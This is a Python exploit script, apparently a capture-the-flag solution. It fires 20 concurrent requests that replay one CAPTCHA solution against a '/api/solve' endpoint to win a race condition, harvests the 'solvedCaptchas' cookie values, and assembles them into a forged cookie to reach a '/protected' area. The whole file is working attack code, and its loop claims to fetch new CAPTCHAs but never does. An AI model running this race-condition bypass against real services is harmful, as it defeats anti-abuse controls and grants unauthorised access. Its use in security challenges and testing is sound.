#!/usr/bin/env python3

import requests
import threading
import urllib.parse
import sys
import os

THREAD_COUNT = 20
SOLVED_CAPTCHAS = []

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld CAPTCHA_ID CAPTCHA_SOLUTION")
    exit(1)
url = sys.argv[1]
captcha_id = sys.argv[2]
solution = sys.argv[3]

def solve_and_race(session, captcha_id, solution):
    try:
        payload = {"captchaId": captcha_id, "solution": solution}
        resp = session.post(f"{url}/api/solve", json=payload)
        if resp.status_code == 200 and resp.json().get('success'):
            print(f"Thread {threading.current_thread().name}: Success!")
            if 'Set-Cookie' in resp.headers:
                cookies = resp.headers['Set-Cookie']
                for cookie in cookies.split(';'):
                    if 'solvedCaptchas=' in cookie:
                        value = urllib.parse.unquote(cookie.split("=", 1)[1]).strip().strip("[\"]")
                        print(f"Appending clean value: {repr(value)}")
                        SOLVED_CAPTCHAS.append(value)
        else:
            # This is expected for threads that lose the race
            print(f"Thread {threading.current_thread().name}: Failed as expected.")
    except requests.exceptions.RequestException as e:
        print(f"Thread {threading.current_thread().name}: Error - {e}")

def main():
    with requests.Session() as session:
        solved_count = 0
        while solved_count < 10:
            print(f"\nFetching CAPTCHA ({solved_count + 1}/10)...")
            try:
                print(f"\nLaunching {THREAD_COUNT} threads to exploit the race condition with your solution...")
                threads = []
                for i in range(THREAD_COUNT):
                    thread = threading.Thread(target=solve_and_race, args=(session, captcha_id, solution), name=f"Race-Thread-{i+1}")
                    threads.append(thread)
                    thread.start()

                for thread in threads:
                    thread.join()
                
                if len(SOLVED_CAPTCHAS) > solved_count:
                    solved_count = len(SOLVED_CAPTCHAS)
                    print(f"Captcha {solved_count} solved successfully!")
                else:
                    print("Captcha not solved. Please try again.")

            except (requests.exceptions.RequestException, KeyError, ValueError) as e:
                print(f"Failed to get CAPTCHA: {e}")
                break

        print("\nAll captchas solved. Checking protected area...")
        
        flat = [item if isinstance(item, str) else item[0] for item in SOLVED_CAPTCHAS]
        cookies = "solvedCaptchas=" + ",".join(flat)
        print(f"Cookies to send: {cookies}")

        try:
            resp = requests.get(f"{url}/protected", headers={"Cookie": cookies})
            if resp.status_code == 200:
                print("\nSuccess! The race condition was exploited.")
                print("Response from protected area:")
                print(resp.text)
            else:
                print("\nAttack failed. The server responded with:")
                print(f"Status: {resp.status_code}")
                print(f"Body: {resp.text}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to access protected area: {e}")

if __name__ == "__main__":
    main()